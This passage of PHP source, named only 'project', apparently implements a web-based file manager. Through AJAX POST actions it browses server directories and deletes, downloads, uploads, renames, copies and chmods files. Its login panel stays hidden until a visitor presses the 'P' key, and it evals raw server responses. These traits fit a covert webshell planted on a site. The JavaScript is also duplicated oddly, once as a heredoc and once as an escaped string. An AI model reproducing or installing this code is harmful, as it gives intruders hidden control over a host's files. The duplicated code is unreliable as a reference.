//<?php 
run();
class project
{
    protected static function js()
    {
        $js = <<<HTML
<script>
function sideOut(d, t) {
\twindow.setTimeout(display, t);
\tfunction display() {
\t\t\$("load").style.display = "none"
\t}
}
function ajax(arg, type) {
\tif (\$("load")) {
\t\t\$("load").style.display = "block";
\t\t\$("load").innerHTML = "\xe6\xad\xa3\xe5\x9c\xa8\xe8\xbd\xbd\xe5\x85\xa5......"
\t}
\tif (type == 2 || arg == 2) {
\t\t\$("load").innerHTML = "\xe5\x8a\x9f\xe8\x83\xbd\xe9\x99\x86\xe7\xbb\xad\xe5\xae\x8c\xe5\x96\x84\xe4\xb8\xad......";
\t\tsideOut(\$("load"), 1500);
\t\treturn
\t}
\tif (type == 1) arg = 'action=show&dir=' + arg;
\tif (type == 3) {
\t\tif (confirm("\xe7\xa1\xae\xe5\xae\x9a\xe5\x88\xa0\xe9\x99\xa4\xe5\xbd\x93\xe5\x89\x8d\xe6\x96\x87\xe4\xbb\xb6\xe4\xb9\x88?")) arg = 'action=delete&file=' + arg;
\t\telse {
\t\t\t\$("load").innerHTML = "\xe6\x93\x8d\xe4\xbd\x9c\xe5\xb7\xb2\xe5\x8f\x96\xe6\xb6\x88";
\t\t\tsideOut(\$("load"), 1500);
\t\t\treturn
\t\t}
\t}
\tif (type == 4) {
\t\twindow.location.href = '?action=download&file=' + arg;
\t\tsideOut(\$("load"), 500);
\t\treturn
\t}
\tif (type == 5) {
\t\tvar mk = prompt('\xe8\xaf\xb7\xe8\xbe\x93\xe5\x85\xa5\xe5\x88\x9b\xe5\xbb\xba\xe6\x96\x87\xe4\xbb\xb6\xe5\xa4\xb9\xe5\x90\x8d\xe7\xa7\xb0:', '');
\t\tif (!mk) {
\t\t\t\$("load").innerHTML = "\xe6\x93\x8d\xe4\xbd\x9c\xe5\xb7\xb2\xe5\x8f\x96\xe6\xb6\x88";
\t\t\tsideOut(\$("load"), 1500);
\t\t\treturn
\t\t}
\t\targ = 'action=_mkdir&dir=' + mk
\t}
\tif (type == 6) {
\t\t\$("upload").style.display = 'block';
\t\t\$("close_file").onclick = function() {
\t\t\t\$("upload").style.display = 'none';
\t\t\t\$("load").innerHTML = "\xe6\x93\x8d\xe4\xbd\x9c\xe5\xb7\xb2\xe5\x8f\x96\xe6\xb6\x88";
\t\t\tsideOut(\$("load"), 1500);
\t\t\treturn
\t\t}
\t\t\$("_file").onclick = function() {
\t\t\tthis.form.submit();
\t\t\t\$("upload").style.display = 'none';
\t\t\t\$("userfile").value = '';
\t\t\treturn
\t\t}
\t\treturn
\t}
\taction = arg ? arg: 'action=show';
\tvar options = {};
\toptions.url = '{self}';
\toptions.listener = callback;
\toptions.method = 'POST';
\tvar request = XmlRequest(options);
\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
\trequest.send(action)
}
function view(arg) {
\taction = 'action=view&file=' + arg;
\tvar options = {};
\toptions.url = '{self}';
\toptions.listener = viewcallback;
\toptions.method = 'POST';
\tvar request = XmlRequest(options);
\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
\trequest.send(action)
}
function edit() {
\t\$("load").style.display = "block";
\t\$("load").innerHTML = "\xe7\xa1\xae\xe4\xbf\x9d\xe7\xbc\x96\xe7\xa0\x81\xe4\xb8\x80\xe8\x87\xb4,\xe4\xb8\x8d\xe5\x9c\xa8\xe6\x8f\x90\xe4\xbe\x9b\xe7\xbc\x96\xe8\xbe\x91\xe5\x8a\x9f\xe8\x83\xbd.\xe5\x8f\xaf\xe4\xbb\xa5\xe4\xbd\xbf\xe7\x94\xa8\xe4\xb8\x8a\xe4\xbc\xa0\xe5\x8a\x9f\xe8\x83\xbd\xe8\xa6\x86\xe7\x9b\x96\xe5\xbd\x93\xe5\x89\x8d\xe7\xbc\x96\xe8\xbe\x91\xe6\x96\x87\xe4\xbb\xb6!";
\tsideOut(\$("load"), 4000);
\treturn
}
function fileperm(name, type) {
\tvar newperm;
\tif (type == 3) newperm = prompt('\xe9\x9c\x80\xe8\xa6\x81\xe8\xbe\x93\xe5\x85\xa5\xe5\xae\x8c\xe6\x95\xb4\xe8\xb7\xaf\xe5\xbe\x84(\xe5\x8c\x85\xe5\x90\xab\xe6\x96\x87\xe4\xbb\xb6\xe5\x90\x8d):', '');
\telse newperm = prompt('\xe8\xaf\xb7\xe8\xbe\x93\xe5\x85\xa5\xe5\x90\x8d\xe7\xa7\xb0:', '');
\tif (!newperm) return;
\tif (type == 1) chmod(name, newperm);
\tif (type == 2) rename(name, newperm);
\tif (type == 3) copy(name, newperm)
}
function chmod(name, perm) {
\taction = 'action=chmod&file=' + name + '&perm=' + perm;
\tvar options = {};
\toptions.url = '{self}';
\toptions.listener = callback;
\toptions.method = 'POST';
\tvar request = XmlRequest(options);
\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
\trequest.send(action)
}
function rename(name, perm) {
\taction = 'action=rename&file=' + name + '&newname=' + perm;
\tvar options = {};
\toptions.url = '{self}';
\toptions.listener = callback;
\toptions.method = 'POST';
\tvar request = XmlRequest(options);
\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
\trequest.send(action)
}
function copy(name, perm) {
\taction = 'action=copyfile&file=' + name + '&copyfile=' + perm;
\tvar options = {};
\toptions.url = '{self}';
\toptions.listener = callback;
\toptions.method = 'POST';
\tvar request = XmlRequest(options);
\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
\trequest.send(action)
}
function XmlRequest(options) {
\tvar req = false;
\tif (window.XMLHttpRequest) {
\t\tvar req = new XMLHttpRequest()
\t} else if (window.ActiveXObject) {
\t\tvar req = new window.ActiveXObject('Microsoft.XMLHTTP')
\t}
\tif (!req) return false;
\treq.onreadystatechange = function() {
\t\tif (req.readyState == 4 && req.status == 200) {
\t\t\toptions.listener.call(req)
\t\t}
\t};
\treq.open(options.method, options.url, true);
\treturn req
}
function viewcallback() {
\tvar data = this.responseText;
\tif (data) {
\t\t\$("open").style.display = "block";
\t\t\$("show_file").focus();
\t\t\$("show_file").innerHTML = data;
\t\tclose();
\t\t\$("show_file").onblur = function() {
\t\t\t\$("open").style.display = "none"
\t\t}
\t} else {
\t\t\$("load").style.display = "block";
\t\t\$("load").innerHTML = "\xe4\xb8\x8d\xe6\x94\xaf\xe6\x8c\x81\xe9\xa2\x84\xe8\xa7\x88\xe6\xad\xa4\xe7\xb1\xbb\xe5\x9e\x8b\xe7\x9a\x84\xe6\x96\x87\xe4\xbb\xb6,\xe6\x88\x96\xe8\x80\x85\xe9\xa2\x84\xe8\xa7\x88\xe7\x9a\x84\xe6\x96\x87\xe4\xbb\xb6\xe5\xa4\xa7\xe4\xba\x8e1Mb!";
\t\tsideOut(\$("load"), 2000);
\t\treturn
\t}
}
function callback() {
\tvar json = eval("(" + this.responseText + ")");
\tif (json.status == 'off') {
\t\tdocument.onkeydown = function(e) {
\t\t    var theEvent = window.event || e;      
            var code = theEvent.keyCode || theEvent.which; 
\t\t\tif (80 == code) {
\t\t\t\t\$("login").style.display = "block"
\t\t\t}
\t\t}
\t}
\tif (json.status == 'close') {
\t\tdocument.body.innerHTML = json.data;
\t\t\$("login").style.display = "block";
\t\tlogin()
\t}
    if (json.status=='on'){
        window.location.reload();
        return;
    }
\tif (json.status == 'ok') {
\t\tajax();
\t\tdocument.body.innerHTML = json.data
\t}
\tif (json.pages == '') {
\t\t\$("pages").style.display = "none"
\t}
\tif (json.pages) {
\t\t\$("pages").style.display = "block";
\t\t\$("pages").innerHTML = json.pages
\t}
\tif (json.node_data) \$("show").innerHTML = json.node_data;
\tif (json.time) \$("runtime").innerHTML = json.time;
\tif (json.listdir) \$("listdir").innerHTML = json.listdir;
\tif (json.memory) \$("memory").innerHTML = json.memory;
\tif (json.disktotal) \$("disktotal").innerHTML = json.disktotal;
\tif (\$("load")) {
\t\t\$("load").style.display = "none"
\t}
\tif (json.error) {
\t\t\$("load").style.display = "block";
\t\t\$("load").innerHTML = json.error;
\t\tsideOut(\$("load"), 1500)
\t}
    \tif (json.notice) {
\t\t\$("load").style.display = "block";
\t\t\$("load").innerHTML = json.notice;
\t\tsideOut(\$("load"), 1500);
\t}
}
function reload() {
\tvar options = {};
\toptions.url = '{self}';
\toptions.listener = callback;
\toptions.method = 'POST';
\tvar request = XmlRequest(options);
\trequest.setRequestHeader('AJAX', 'true');
\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
\trequest.send('action=init')
}
function addEvent(obj, evt, fn) {
\tif (obj.addEventListener) {
\t\tobj.addEventListener(evt, fn, false)
\t} else if (obj.attachEvent) {
\t\tobj.attachEvent('on' + evt, fn)
\t}
}
function init() {
\t\$();
\tlogin();
\treload()
}
function close() {
\t\$("close").onclick = function() {
\t\t\$("open").style.display = "none"
\t}
}
function login() {
\t\$("login_open").onclick = function() {
\t\tvar pwd = \$("pwd").value;
\t\tvar options = {};
\t\toptions.url = '{self}';
\t\toptions.listener = callback;
\t\toptions.method = 'POST';
\t\tvar request = XmlRequest(options);
\t\trequest.setRequestHeader('AJAX', 'true');
\t\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
\t\tif (pwd) request.send('pwd=' + pwd)
\t}
}
function \$(d) {
\treturn document.getElementById(d)
}
addEvent(window, 'load', init);
</script>
HTML;
        return "<script>\r\nfunction sideOut(d, t) {\r\n\twindow.setTimeout(display, t);\r\n\tfunction display() {\r\n\t\t\$(\"load\").style.display = \"none\"\r\n\t}\r\n}\r\nfunction ajax(arg, type) {\r\n\tif (\$(\"load\")) {\r\n\t\t\$(\"load\").style.display = \"block\";\r\n\t\t\$(\"load\").innerHTML = \"\xe6\xad\xa3\xe5\x9c\xa8\xe8\xbd\xbd\xe5\x85\xa5......\"\r\n\t}\r\n\tif (type == 2 || arg == 2) {\r\n\t\t\$(\"load\").innerHTML = \"\xe5\x8a\x9f\xe8\x83\xbd\xe9\x99\x86\xe7\xbb\xad\xe5\xae\x8c\xe5\x96\x84\xe4\xb8\xad......\";\r\n\t\tsideOut(\$(\"load\"), 1500);\r\n\t\treturn\r\n\t}\r\n\tif (type == 1) arg = 'action=show&dir=' + arg;\r\n\tif (type == 3) {\r\n\t\tif (confirm(\"\xe7\xa1\xae\xe5\xae\x9a\xe5\x88\xa0\xe9\x99\xa4\xe5\xbd\x93\xe5\x89\x8d\xe6\x96\x87\xe4\xbb\xb6\xe4\xb9\x88?\")) arg = 'action=delete&file=' + arg;\r\n\t\telse {\r\n\t\t\t\$(\"load\").innerHTML = \"\xe6\x93\x8d\xe4\xbd\x9c\xe5\xb7\xb2\xe5\x8f\x96\xe6\xb6\x88\";\r\n\t\t\tsideOut(\$(\"load\"), 1500);\r\n\t\t\treturn\r\n\t\t}\r\n\t}\r\n\tif (type == 4) {\r\n\t\twindow.location.href = '?action=download&file=' + arg;\r\n\t\tsideOut(\$(\"load\"), 500);\r\n\t\treturn\r\n\t}\r\n\tif (type == 5) {\r\n\t\tvar mk = prompt('\xe8\xaf\xb7\xe8\xbe\x93\xe5\x85\xa5\xe5\x88\x9b\xe5\xbb\xba\xe6\x96\x87\xe4\xbb\xb6\xe5\xa4\xb9\xe5\x90\x8d\xe7\xa7\xb0:', '');\r\n\t\tif (!mk) {\r\n\t\t\t\$(\"load\").innerHTML = \"\xe6\x93\x8d\xe4\xbd\x9c\xe5\xb7\xb2\xe5\x8f\x96\xe6\xb6\x88\";\r\n\t\t\tsideOut(\$(\"load\"), 1500);\r\n\t\t\treturn\r\n\t\t}\r\n\t\targ = 'action=_mkdir&dir=' + mk\r\n\t}\r\n\tif (type == 6) {\r\n\t\t\$(\"upload\").style.display = 'block';\r\n\t\t\$(\"close_file\").onclick = function() {\r\n\t\t\t\$(\"upload\").style.display = 'none';\r\n\t\t\t\$(\"load\").innerHTML = \"\xe6\x93\x8d\xe4\xbd\x9c\xe5\xb7\xb2\xe5\x8f\x96\xe6\xb6\x88\";\r\n\t\t\tsideOut(\$(\"load\"), 1500);\r\n\t\t\treturn\r\n\t\t}\r\n\t\t\$(\"_file\").onclick = function() {\r\n\t\t\tthis.form.submit();\r\n\t\t\t\$(\"upload\").style.display = 'none';\r\n\t\t\t\$(\"userfile\").value = '';\r\n\t\t\treturn\r\n\t\t}\r\n\t\treturn\r\n\t}\r\n\taction = arg ? arg: 'action=show';\r\n\tvar options = {};\r\n\toptions.url = 'self';\r\n\toptions.listener = callback;\r\n\toptions.method = 'POST';\r\n\tvar request = XmlRequest(options);\r\n\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\r\n\trequest.send(action)\r\n}\r\nfunction view(arg) {\r\n\taction = 'action=view&file=' + arg;\r\n\tvar options = {};\r\n\toptions.url = 'self';\r\n\toptions.listener = viewcallback;\r\n\toptions.method = 'POST';\r\n\tvar request = XmlRequest(options);\r\n\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\r\n\trequest.send(action)\r\n}\r\nfunction edit() {\r\n\t\$(\"load\").style.display = \"block\";\r\n\t\$(\"load\").innerHTML = \"\xe7\xa1\xae\xe4\xbf\x9d\xe7\xbc\x96\xe7\xa0\x81\xe4\xb8\x80\xe8\x87\xb4,\xe4\xb8\x8d\xe5\x9c\xa8\xe6\x8f\x90\xe4\xbe\x9b\xe7\xbc\x96\xe8\xbe\x91\xe5\x8a\x9f\xe8\x83\xbd.\xe5\x8f\xaf\xe4\xbb\xa5\xe4\xbd\xbf\xe7\x94\xa8\xe4\xb8\x8a\xe4\xbc\xa0\xe5\x8a\x9f\xe8\x83\xbd\xe8\xa6\x86\xe7\x9b\x96\xe5\xbd\x93\xe5\x89\x8d\xe7\xbc\x96\xe8\xbe\x91\xe6\x96\x87\xe4\xbb\xb6!\";\r\n\tsideOut(\$(\"load\"), 4000);\r\n\treturn\r\n}\r\nfunction fileperm(name, type) {\r\n\tvar newperm;\r\n\tif (type == 3) newperm = prompt('\xe9\x9c\x80\xe8\xa6\x81\xe8\xbe\x93\xe5\x85\xa5\xe5\xae\x8c\xe6\x95\xb4\xe8\xb7\xaf\xe5\xbe\x84(\xe5\x8c\x85\xe5\x90\xab\xe6\x96\x87\xe4\xbb\xb6\xe5\x90\x8d):', '');\r\n\telse newperm = prompt('\xe8\xaf\xb7\xe8\xbe\x93\xe5\x85\xa5\xe5\x90\x8d\xe7\xa7\xb0:', '');\r\n\tif (!newperm) return;\r\n\tif (type == 1) chmod(name, newperm);\r\n\tif (type == 2) rename(name, newperm);\r\n\tif (type == 3) copy(name, newperm)\r\n}\r\nfunction chmod(name, perm) {\r\n\taction = 'action=chmod&file=' + name + '&perm=' + perm;\r\n\tvar options = {};\r\n\toptions.url = 'self';\r\n\toptions.listener = callback;\r\n\toptions.method = 'POST';\r\n\tvar request = XmlRequest(options);\r\n\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\r\n\trequest.send(action)\r\n}\r\nfunction rename(name, perm) {\r\n\taction = 'action=rename&file=' + name + '&newname=' + perm;\r\n\tvar options = {};\r\n\toptions.url = 'self';\r\n\toptions.listener = callback;\r\n\toptions.method = 'POST';\r\n\tvar request = XmlRequest(options);\r\n\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\r\n\trequest.send(action)\r\n}\r\nfunction copy(name, perm) {\r\n\taction = 'action=copyfile&file=' + name + '&copyfile=' + perm;\r\n\tvar options = {};\r\n\toptions.url = 'self';\r\n\toptions.listener = callback;\r\n\toptions.method = 'POST';\r\n\tvar request = XmlRequest(options);\r\n\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\r\n\trequest.send(action)\r\n}\r\nfunction XmlRequest(options) {\r\n\tvar req = false;\r\n\tif (window.XMLHttpRequest) {\r\n\t\tvar req = new XMLHttpRequest()\r\n\t} else if (window.ActiveXObject) {\r\n\t\tvar req = new window.ActiveXObject('Microsoft.XMLHTTP')\r\n\t}\r\n\tif (!req) return false;\r\n\treq.onreadystatechange = function() {\r\n\t\tif (req.readyState == 4 && req.status == 200) {\r\n\t\t\toptions.listener.call(req)\r\n\t\t}\r\n\t};\r\n\treq.open(options.method, options.url, true);\r\n\treturn req\r\n}\r\nfunction viewcallback() {\r\n\tvar data = this.responseText;\r\n\tif (data) {\r\n\t\t\$(\"open\").style.display = \"block\";\r\n\t\t\$(\"show_file\").focus();\r\n\t\t\$(\"show_file\").innerHTML = data;\r\n\t\tclose();\r\n\t\t\$(\"show_file\").onblur = function() {\r\n\t\t\t\$(\"open\").style.display = \"none\"\r\n\t\t}\r\n\t} else {\r\n\t\t\$(\"load\").style.display = \"block\";\r\n\t\t\$(\"load\").innerHTML = \"\xe4\xb8\x8d\xe6\x94\xaf\xe6\x8c\x81\xe9\xa2\x84\xe8\xa7\x88\xe6\xad\xa4\xe7\xb1\xbb\xe5\x9e\x8b\xe7\x9a\x84\xe6\x96\x87\xe4\xbb\xb6,\xe6\x88\x96\xe8\x80\x85\xe9\xa2\x84\xe8\xa7\x88\xe7\x9a\x84\xe6\x96\x87\xe4\xbb\xb6\xe5\xa4\xa7\xe4\xba\x8e1Mb!\";\r\n\t\tsideOut(\$(\"load\"), 2000);\r\n\t\treturn\r\n\t}\r\n}\r\nfunction callback() {\r\n\tvar json = eval(\"(\" + this.responseText + \")\");\r\n\tif (json.status == 'off') {\r\n\t\tdocument.onkeydown = function(e) {\r\n\t\t    var theEvent = window.event || e;      \r\n            var code = theEvent.keyCode || theEvent.which; \r\n\t\t\tif (80 == code) {\r\n\t\t\t\t\$(\"login\").style.display = \"block\"\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tif (json.status == 'close') {\r\n\t\tdocument.body.innerHTML = json.data;\r\n\t\t\$(\"login\").style.display = \"block\";\r\n\t\tlogin()\r\n\t}\r\n    if (json.status=='on'){\r\n        window.location.reload();\r\n        return;\r\n    }\r\n\tif (json.status == 'ok') {\r\n\t\tajax();\r\n\t\tdocument.body.innerHTML = json.data\r\n\t}\r\n\tif (json.pages == '') {\r\n\t\t\$(\"pages\").style.display = \"none\"\r\n\t}\r\n\tif (json.pages) {\r\n\t\t\$(\"pages\").style.display = \"block\";\r\n\t\t\$(\"pages\").innerHTML = json.pages\r\n\t}\r\n\tif (json.node_data) \$(\"show\").innerHTML = json.node_data;\r\n\tif (json.time) \$(\"runtime\").innerHTML = json.time;\r\n\tif (json.listdir) \$(\"listdir\").innerHTML = json.listdir;\r\n\tif (json.memory) \$(\"memory\").innerHTML = json.memory;\r\n\tif (json.disktotal) \$(\"disktotal\").innerHTML = json.disktotal;\r\n\tif (\$(\"load\")) {\r\n\t\t\$(\"load\").style.display = \"none\"\r\n\t}\r\n\tif (json.error) {\r\n\t\t\$(\"load\").style.display = \"block\";\r\n\t\t\$(\"load\").innerHTML = json.error;\r\n\t\tsideOut(\$(\"load\"), 1500)\r\n\t}\r\n    \tif (json.notice) {\r\n\t\t\$(\"load\").style.display = \"block\";\r\n\t\t\$(\"load\").innerHTML = json.notice;\r\n\t\tsideOut(\$(\"load\"), 1500);\r\n\t}\r\n}\r\nfunction reload() {\r\n\tvar options = {};\r\n\toptions.url = 'self';\r\n\toptions.listener = callback;\r\n\toptions.method = 'POST';\r\n\tvar request = XmlRequest(options);\r\n\trequest.setRequestHeader('AJAX', 'true');\r\n\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\r\n\trequest.send('action=init')\r\n}\r\nfunction addEvent(obj, evt, fn) {\r\n\tif (obj.addEventListener) {\r\n\t\tobj.addEventListener(evt, fn, false)\r\n\t} else if (obj.attachEvent) {\r\n\t\tobj.attachEvent('on' + evt, fn)\r\n\t}\r\n}\r\nfunction init() {\r\n\t\$();\r\n\tlogin();\r\n\treload()\r\n}\r\nfunction close() {\r\n\t\$(\"close\").onclick = function() {\r\n\t\t\$(\"open\").style.display = \"none\"\r\n\t}\r\n}\r\nfunction login() {\r\n\t\$(\"login_open\").onclick = function() {\r\n\t\tvar pwd = \$(\"pwd\").value;\r\n\t\tvar options = {};\r\n\t\toptions.url = 'self';\r\n\t\toptions.listener = callback;\r\n\t\toptions.method = 'POST';\r\n\t\tvar request = XmlRequest(options);\r\n\t\trequest.setRequestHeader('AJAX', 'true');\r\n\t\trequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\r\n\t\tif (pwd) request.send('pwd=' + pwd)\r\n\t}\r\n}\r\nfunction \$(d) {\r\n\treturn document.getElementById(d)\r\n}\r\naddEvent(window, 'load', init);\r\n</script>";
    }
    protected static function css()
    {
        $css = <<<HTML
 input{font:11px Verdana;BACKGROUND:#FFFFFF;height:18px;border:1px solid #666666;}a{color:#00f;text-decoration:underline;}a:hover{color:#f00;text-decoration:none;}body{font:12px Arial,Tahoma;line-height:16px;margin:0;padding:0;}#header{height:20px;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#header .left{float:left;}#header .right{float:right;}#menu{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}#content{margin:0 auto;width:98%;}#content h2{margin-top:15px;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}#content #base,#content #base2{background:#eee;margin-bottom:10px;}#base input{float:right;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;margin:5px 10px;}.cdrom{padding:5px;margin:auto 7px;}.h{margin-top:8px;}#base2 .input{font:12px Arial,Tahoma;background:#fff;border:1px solid #666;padding:2px;height:18px;}#base2 .bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}dl,dt,dd{margin:0;}.focus{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}.fff{background:#fff}dl{margin:0 auto;width:100%;}dt,dd{overflow:hidden;border-top:1px solid white;border-bottom:1px solid #DDD;background:#F1F1F1;padding:5px 15px 5px 5px;}dt{border-top:1px solid white;border-bottom:1px solid #DDD;background:#E9E9E9;font-weight:bold;padding:5px 15px 5px 5px;}dt span,dd span{width:19%;display:inline-block;text-indent:0em;overflow:hidden;}#footer{padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;}#load{position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display:none;}.in{width:40px;text-align:center;}#pages{display:none;}.high{background-color:#0449BE;color:white;margin:0 2px;padding:2px 3px;width:10px;}.high2{margin:0 2px;padding:2px 0px;width:10px;}#login{display:none;}#show_file{color:#000;height:400px;width:800px;position:fixed;top:45%;left:50%;margin-top:-200px;margin-left:-400px;background:#fff;overflow:auto;}#open,#upload{display:none;position:fixed;top:45%;left:50%;margin-top:-200px;margin-left:-400px;}#close{color:#fff;height:16px;width:30px;position:absolute;right:0;background:#000;z-index:1;}#upfile{width:628px;height:108px;padding:10px 20px;background-color:white;position:fixed;top:45%;left:50%;margin-top:-54px;margin-left:-314px;}
HTML;
        return " input{font:11px Verdana;BACKGROUND:#FFFFFF;height:18px;border:1px solid #666666;}a{color:#00f;text-decoration:underline;}a:hover{color:#f00;text-decoration:none;}body{font:12px Arial,Tahoma;line-height:16px;margin:0;padding:0;}#header{height:20px;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#header .left{float:left;}#header .right{float:right;}#menu{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}#content{margin:0 auto;width:98%;}#content h2{margin-top:15px;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}#content #base,#content #base2{background:#eee;margin-bottom:10px;}#base input{float:right;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;margin:5px 10px;}.cdrom{padding:5px;margin:auto 7px;}.h{margin-top:8px;}#base2 .input{font:12px Arial,Tahoma;background:#fff;border:1px solid #666;padding:2px;height:18px;}#base2 .bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}dl,dt,dd{margin:0;}.focus{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}.fff{background:#fff}dl{margin:0 auto;width:100%;}dt,dd{overflow:hidden;border-top:1px solid white;border-bottom:1px solid #DDD;background:#F1F1F1;padding:5px 15px 5px 5px;}dt{border-top:1px solid white;border-bottom:1px solid #DDD;background:#E9E9E9;font-weight:bold;padding:5px 15px 5px 5px;}dt span,dd span{width:19%;display:inline-block;text-indent:0em;overflow:hidden;}#footer{padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;}#load{position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display:none;}.in{width:40px;text-align:center;}#pages{display:none;}.high{background-color:#0449BE;color:white;margin:0 2px;padding:2px 3px;width:10px;}.high2{margin:0 2px;padding:2px 0px;width:10px;}#login{display:none;}#show_file{color:#000;height:400px;width:800px;position:fixed;top:45%;left:50%;margin-top:-200px;margin-left:-400px;background:#fff;overflow:auto;}#open,#upload{display:none;position:fixed;top:45%;left:50%;margin-top:-200px;margin-left:-400px;}#close{color:#fff;height:16px;width:30px;position:absolute;right:0;background:#000;z-index:1;}#upfile{width:628px;height:108px;padding:10px 20px;background-color:white;position:fixed;top:45%;left:50%;margin-top:-54px;margin-left:-314px;}";
    }
    static function init()
    {
        self::authentication();
    }
    function show($msg = '')
    {
        self::G('runtime');
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        header("Content-type:text/html;charset=utf-8");
        $url = isset($_COOKIE['PATH']) ? $_COOKIE['PATH'] : self::convert_to_utf8(sprintf("%s%s", rtrim(__ROOT__, "/"), "/"), 'utf8');
        $file = !empty($_POST["dir"]) ? urldecode(self::convert_to_utf8(rtrim($_POST["dir"], '/'), 'utf8')) . "/" : $url;
        if (!is_readable($file)) {
            return false;
        }
        setcookie("PATH", $file, time() + 3600);
        clearstatcache();
        if (function_exists("scandir")) {
            $array = scandir($file);
        } elseif (function_exists("glob")) {
            foreach (glob($file . '*') as $ff) {
                $array[] = basename($ff);
            }
        }
        /********分页开始*********/
        $total_nums = count($array);
        $page_nums = 50;
        $nums = $total_nums > $page_nums ? ceil($total_nums / $page_nums) : 1;
        if ($nums > 1) {
            $page = intval($_POST['page']) ? intval($_POST['page']) : 1;
            if ($page > $nums || $page < 1) {
                $page = 1;
            }
            if ($page == 1) {
                $for_start = 0;
                $for_page = $page * $page_nums - 1;
            } else {
                $for_page = $page * $page_nums - 1 > $total_nums ? $total_nums : $page * $page_nums - 1;
                $for_start = $page * $page_nums - 1 > $total_nums ? ($page - 1) * $page_nums - 2 : $for_page - $page_nums - 1;
            }
        }
        if ($nums == 1) {
            $for_start = 0;
            $for_page = $total_nums;
        }
        for ($i = $for_start; $i < $for_page; ++$i) {
            if ($array[$i] == '.' || $array[$i] == '..') {
                continue;
            }
            if (is_dir($file . $array[$i])) {
                $dir[] = $array[$i];
            } elseif (is_file($file . $array[$i])) {
                $files[] = $array[$i];
            }
        }
        $next = $page + 1 <= $nums ? $page + 1 : $nums;
        $previous = $page - 1 > 1 ? $page - 1 : 1;
        if ($nums > 10) {
            if ($page > 5) {
                if ($nums - $page >= 5) {
                    $ipage = $page - 4;
                    $_nums = $page + 5;
                } else {
                    $ipage = $nums - 9;
                    $_nums = $nums;
                }
            } else {
                $ipage = 1;
                $_nums = 10;
            }
        } else {
            $ipage = 1;
            $_nums = $nums;
        }
        for ($i = $ipage; $i <= $_nums; ++$i) {
            if ($i == $page) {
                $_page .= sprintf('<a  class="high" href="javascript:;;;" name="action=show&dir=%s&page=%s" onclick="ajax(this.name)">%s</a> ', urlencode(self::convert_to_utf8($file)), $i, $i);
            } else {
                $_page .= sprintf('<a href="javascript:;;;" name="action=show&dir=%s&page=%s" onclick="ajax(this.name)">%s</a> ', urlencode(self::convert_to_utf8($file)), $i, $i);
            }
        }
        /*****************
               分页结束
           ******************/
        if (!isset($dir)) {
            $dir = array();
        }
        if (!isset($files)) {
            $files = array();
        }
        $_ipage_file = urlencode(rtrim(self::convert_to_utf8($file), '/'));
        //bug修复
        $_pages = <<<HTML
    <dl>
    <dd>
    <span class="in">\xe3\x80\x80</span>
    <span></span>
    <span></span>
    <span></span>
    <span style="text-align:right;width:38%">
    <a class="high2" href="javascript:;;;" name="action=show&dir={$_ipage_file}&page=1" onclick="ajax(this.name)">Index</a>   
    <a class="high2" href="javascript:;;;" name="action=show&dir={$_ipage_file}&page={$previous}" onclick="ajax(this.name)">Previous</a>
    {pages}
    <a class="high2" href="javascript:;;;" name="action=show&dir={$_ipage_file}&page={$next}" onclick="ajax(this.name)">Next</a>
    <a class="high2" href="javascript:;;;" name="action=show&dir={$_ipage_file}&page={$nums}" onclick="ajax(this.name)">End</a>
    </dd>
    </dl>
HTML;
        $return = <<<HTML
 <!-- return -->
 <dl>
  <dt>
    <span class="in">\xe3\x80\x80</span>
    <span>\xe6\x96\x87\xe4\xbb\xb6\xe5\x90\x8d</span>
    <span>\xe4\xbf\xae\xe6\x94\xb9\xe6\x97\xb6\xe9\x97\xb4</span>
    <span>\xe6\x96\x87\xe4\xbb\xb6\xe5\xa4\xa7\xe5\xb0\x8f</span>
    <span>\xe6\x9d\x83\xe9\x99\x90</span>
    <span>\xe6\x93\x8d\xe4\xbd\x9c</span>
  </dt>
  <dd >
    <span class="in">
    -
    </span>
    <span>
      <a href="javascript:;;;" name="{back}" onclick="ajax(this.name,1)">\xe8\xbf\x94\xe5\x9b\x9e\xe4\xb8\x8a\xe4\xb8\x80\xe7\x9b\xae\xe5\xbd\x95</a>
